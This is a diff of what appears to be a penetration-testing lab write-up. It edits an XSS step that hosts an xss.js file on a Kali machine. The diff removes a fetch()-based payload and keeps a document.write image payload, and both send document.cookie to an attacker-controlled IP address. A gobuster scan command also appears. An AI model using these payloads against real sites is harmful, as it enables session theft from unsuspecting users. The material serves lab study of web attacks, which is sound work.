@@ -30,10 +30,6 @@ gobuster dir -u 192.168.236.121 -w /usr/share/seclists/Discovery/Web-Content/raf
 
 - Create a xss.js file on kali machine and host it.
 ```
-let cookie = document.cookie
-let encodedCookie = encodeURIComponent(cookie)
-fetch("http://192.168.45.226:80/exfil?data="+encodedCookie)
-
 document.write('<img src="http://192.168.45.226:80/?exfil='+document.cookie+'" />');
 ```
 - Start the HTTP server.
